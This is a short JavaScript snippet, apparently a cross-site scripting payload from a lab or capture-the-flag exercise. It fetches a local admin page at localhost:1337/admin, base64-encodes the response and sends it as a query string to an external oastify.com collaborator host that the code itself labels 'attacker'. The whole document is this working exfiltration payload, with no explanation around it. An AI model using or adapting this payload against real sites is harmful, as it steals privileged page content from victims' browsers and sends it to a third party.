
var url = "http://localhost:1337/admin";
var attacker = "https://rhcgp5j2hjgurtxn59u57n2jpav1ju7j.oastify.com";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);